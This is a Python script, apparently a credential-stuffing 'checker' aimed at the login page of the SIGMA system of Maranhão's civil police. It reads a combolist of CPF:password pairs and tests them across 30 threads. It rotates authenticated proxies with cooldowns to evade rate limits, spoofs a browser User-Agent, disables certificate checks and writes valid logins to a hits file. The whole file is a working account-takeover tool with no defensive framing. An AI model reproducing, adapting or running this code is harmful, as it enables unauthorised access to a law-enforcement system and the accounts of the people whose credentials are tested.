#!/usr/bin/env python3
"""
Checker SIGMA — Policia Civil MA
https://sigma.policiacivil.ma.gov.br/
Uso: python scripts/checker_sigma.py

Stack: nginx/1.10.3 + Spring Boot (Thymeleaf)
Login: POST / | fields: username (CPF 000.000.000-00), password
HIT:     302 -> Location != '/' e != dominio raiz
INVALID: 302 -> Location = '/' ou dominio raiz
ERROR:   timeout / conn error / 5xx
"""

import requests
import threading
import time
import random
import re
import os
import sys
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from rich.console import Console
from rich.progress import Progress, TextColumn, BarColumn, TimeRemainingColumn, SpinnerColumn
from rich.panel import Panel
from rich.table import Table
from pyfiglet import Figlet

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ─────────────────────────── CONFIG ───────────────────────────
URL_BASE      = "https://sigma.policiacivil.ma.gov.br"
URL_LOGIN     = f"{URL_BASE}/"
THREADS       = 30
TIMEOUT       = 15
COMBO_FILE    = "outputs/sigma_combo.txt"
HITS_FILE     = "outputs/sigma_hits.txt"
DEAD_FILE     = "outputs/sigma_dead.txt"
ERRORS_FILE   = "outputs/sigma_errors.txt"
PROXY_FILE    = "scripts/proxies_sigma.txt"
PROXY_COOLDOWN = 30      # segundos de cooldown por proxy em rate limit
MAX_ERROS_PROXY = 4      # erros consecutivos antes de colocar proxy em cooldown

console = Console()

# ─────────────────────────── PROXIES ──────────────────────────
class ProxyManager:
    def __init__(self, proxy_file):
        self.proxies = []
        self.cooldown = {}       # proxy -> timestamp de liberacao
        self.erros    = {}       # proxy -> contador de erros consecutivos
        self.lock     = threading.Lock()
        self._carregar(proxy_file)

    def _carregar(self, path):
        if not os.path.exists(path):
            console.print(f"[red][ERRO] Arquivo de proxies nao encontrado: {path}[/red]")
            sys.exit(1)
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(":")
                if len(parts) == 4:
                    ip, port, user, pwd = parts
                    proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
                    self.proxies.append(proxy_url)
                    self.erros[proxy_url] = 0
        console.print(f"[cyan][INFO] {len(self.proxies)} proxies carregados[/cyan]")

    def get(self):
        with self.lock:
            agora = time.time()
            disponiveis = [
                p for p in self.proxies
                if self.cooldown.get(p, 0) <= agora
            ]
            if not disponiveis:
                # todos em cooldown — aguarda o mais proximo liberar
                proximo = min(self.cooldown.values())
                espera = max(0, proximo - agora)
                time.sleep(espera + 0.5)
                disponiveis = self.proxies[:]
            return random.choice(disponiveis)

    def reportar_ok(self, proxy):
        with self.lock:
            self.erros[proxy] = 0

    def reportar_erro(self, proxy, rate_limit=False):
        with self.lock:
            if rate_limit:
                self.cooldown[proxy] = time.time() + PROXY_COOLDOWN
                self.erros[proxy] = 0
                console.print(f"[yellow][RL] Proxy em cooldown {PROXY_COOLDOWN}s: {proxy.split('@')[-1]}[/yellow]")
            else:
                self.erros[proxy] = self.erros.get(proxy, 0) + 1
                if self.erros[proxy] >= MAX_ERROS_PROXY:
                    self.cooldown[proxy] = time.time() + PROXY_COOLDOWN
                    self.erros[proxy] = 0
                    console.print(f"[yellow][WARN] Proxy com muitos erros, cooldown: {proxy.split('@')[-1]}[/yellow]")


# ─────────────────────────── COMBOLIST ────────────────────────
def formatar_cpf(cpf_raw):
    """Formata CPF para 000.000.000-00"""
    d = re.sub(r'\D', '', cpf_raw)
    if len(d) != 11:
        return None
    return f"{d[:3]}.{d[3:6]}.{d[6:9]}-{d[9:]}"

def limpar_combolist(path):
    """
    Carrega e filtra combo:
    - Aceita CPF (11 digitos) como username
    - Remove duplicados (normalizado)
    - Ignora linhas sem ':'
    """
    if not os.path.exists(path):
        console.print(f"[red][ERRO] Combolist nao encontrada: {path}[/red]")
        sys.exit(1)

    result = []
    seen   = set()
    total_raw = 0

    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" not in line:
                continue
            total_raw += 1
            user, _, pwd = line.partition(":")
            user = user.strip()
            pwd  = pwd.strip()
            if not pwd:
                continue

            clean = re.sub(r'\D', '', user)
            if len(clean) == 11 and clean.isdigit():
                if clean not in seen:
                    seen.add(clean)
                    cpf_fmt = formatar_cpf(clean)
                    result.append((cpf_fmt, pwd))

    console.print(f"[cyan][INFO] Combo: {total_raw} raw -> {len(result)} CPFs unicos validos[/cyan]")
    return result


# ─────────────────────────── CHECKER ──────────────────────────
class SigmaChecker:
    def __init__(self, proxy_mgr):
        self.pm      = proxy_mgr
        self.hits    = []
        self.invalid = 0
        self.errors  = 0
        self.lock    = threading.Lock()

        os.makedirs("outputs", exist_ok=True)
        # Abre arquivos de saida (append)
        self.f_hits   = open(HITS_FILE,   "a", buffering=1)
        self.f_dead   = open(DEAD_FILE,   "a", buffering=1)
        self.f_errors = open(ERRORS_FILE, "a", buffering=1)

    def _session(self, proxy_url):
        s = requests.Session()
        s.proxies = {"http": proxy_url, "https": proxy_url}
        s.verify  = False
        s.headers.update({
            "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "pt-BR,pt;q=0.9",
            "Referer":         URL_LOGIN,
        })
        return s

    def _get_session_cookie(self, session):
        """Obtem JSESSIONID via GET na pagina de login"""
        resp = session.get(URL_LOGIN, timeout=TIMEOUT, allow_redirects=True)
        return resp.cookies.get("JSESSIONID")

    def checar(self, cpf, senha):
        proxy = self.pm.get()
        session = self._session(proxy)

        try:
            # 1. GET para obter cookie de sessao
            jsid = self._get_session_cookie(session)
            if not jsid:
                self.pm.reportar_erro(proxy)
                return "ERROR", cpf, senha

            # 2. POST com credenciais
            data = {
                "username": cpf,
                "password": senha,
            }
            resp = session.post(
                URL_LOGIN,
                data=data,
                timeout=TIMEOUT,
                allow_redirects=False,
            )

            self.pm.reportar_ok(proxy)

            # ── Deteccao de resultado ──
            status = resp.status_code
            location = resp.headers.get("Location", "")

            # Rate limit / bloqueio
            if status in (429, 503):
                self.pm.reportar_erro(proxy, rate_limit=True)
                return "ERROR", cpf, senha

            if status == 302:
                loc_clean = location.rstrip("/").replace("http://sigma.policiacivil.ma.gov.br", "").replace("https://sigma.policiacivil.ma.gov.br", "")
                if loc_clean in ("", "/"):
                    return "INVALID", cpf, senha
                else:
                    # Redireciona para outro path = login bem-sucedido
                    return "HIT", cpf, senha

            # Resposta inesperada
            return "ERROR", cpf, senha

        except requests.exceptions.ProxyError:
            self.pm.reportar_erro(proxy, rate_limit=False)
            return "ERROR", cpf, senha
        except requests.exceptions.Timeout:
            self.pm.reportar_erro(proxy)
            return "ERROR", cpf, senha
        except Exception:
            self.pm.reportar_erro(proxy)
            return "ERROR", cpf, senha

    def _salvar(self, categoria, cpf, senha):
        credencial = f"{cpf}:{senha}"
        with self.lock:
            if categoria == "HIT":
                self.hits.append(credencial)
                self.f_hits.write(credencial + "\n")
            elif categoria == "INVALID":
                self.invalid += 1
                self.f_dead.write(credencial + "\n")
            else:
                self.errors += 1
                self.f_errors.write(credencial + "\n")

    def fechar(self):
        self.f_hits.close()
        self.f_dead.close()
        self.f_errors.close()


# ─────────────────────────── BANNER ───────────────────────────
def show_banner():
    f = Figlet(font="slant")
    banner = f.renderText("SIGMA")
    cores = [Fore.BLUE, Fore.CYAN, Fore.GREEN, Fore.YELLOW]
    for i, line in enumerate(banner.split("\n")):
        print(cores[i % len(cores)] + line)
    print(Fore.YELLOW + "=" * 62 + Style.RESET_ALL)
    print(f"{Fore.CYAN}Alvo   :{Style.RESET_ALL} {URL_LOGIN}")
    print(f"{Fore.CYAN}Threads:{Style.RESET_ALL} {THREADS}")
    print(f"{Fore.CYAN}Timeout:{Style.RESET_ALL} {TIMEOUT}s")
    print(f"{Fore.CYAN}Proxies:{Style.RESET_ALL} 50 rotativos com cooldown automatico")
    print(Fore.YELLOW + "=" * 62 + Style.RESET_ALL + "\n")


# ─────────────────────────── MAIN ─────────────────────────────
def main():
    show_banner()

    proxy_mgr = ProxyManager(PROXY_FILE)
    combos    = limpar_combolist(COMBO_FILE)
    checker   = SigmaChecker(proxy_mgr)

    if not combos:
        console.print("[red][ERRO] Nenhuma combo valida encontrada.[/red]")
        sys.exit(1)

    total = len(combos)
    inicio = time.time()

    console.print(f"\n[bold cyan]Iniciando verificacao de {total} credenciais...[/bold cyan]\n")

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold blue]{task.description}"),
        BarColumn(bar_width=35),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("[green][HIT] {task.fields[hits]}"),
        TextColumn("[red][DIE] {task.fields[invalid]}"),
        TextColumn("[yellow][ERR] {task.fields[errors]}"),
        TimeRemainingColumn(),
        console=console,
        refresh_per_second=4,
    ) as progress:

        task = progress.add_task(
            "SIGMA Check",
            total=total,
            hits=0,
            invalid=0,
            errors=0,
        )

        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {
                executor.submit(checker.checar, cpf, senha): (cpf, senha)
                for cpf, senha in combos
            }

            for future in as_completed(futures):
                cpf, senha = futures[future]
                try:
                    resultado, cpf_r, senha_r = future.result()
                except Exception:
                    resultado = "ERROR"

                checker._salvar(resultado, cpf, senha)

                with checker.lock:
                    h = len(checker.hits)
                    d = checker.invalid
                    e = checker.errors

                progress.update(task, advance=1, hits=h, invalid=d, errors=e)

                if resultado == "HIT":
                    console.print(
                        Panel(
                            f"[bold green][HIT] LOGIN VALIDO[/bold green]\n[white]{cpf}:{senha}[/white]",
                            border_style="green",
                        )
                    )

    checker.fechar()
    elapsed = time.time() - inicio

    # Resumo final
    table = Table(title="RESUMO FINAL — SIGMA CHECKER", border_style="cyan")
    table.add_column("Metrica",  style="bold cyan")
    table.add_column("Valor",    style="bold white")
    table.add_row("Total processado", str(total))
    table.add_row("[green]HITS (validos)[/green]", str(len(checker.hits)))
    table.add_row("[red]INVALIDOS[/red]",           str(checker.invalid))
    table.add_row("[yellow]ERROS de rede[/yellow]", str(checker.errors))
    table.add_row("Tempo total",   f"{elapsed:.1f}s")
    table.add_row("Velocidade",    f"{total/elapsed:.1f} checks/s")
    table.add_row("Hits salvo em", HITS_FILE)
    console.print(table)


if __name__ == "__main__":
    main()
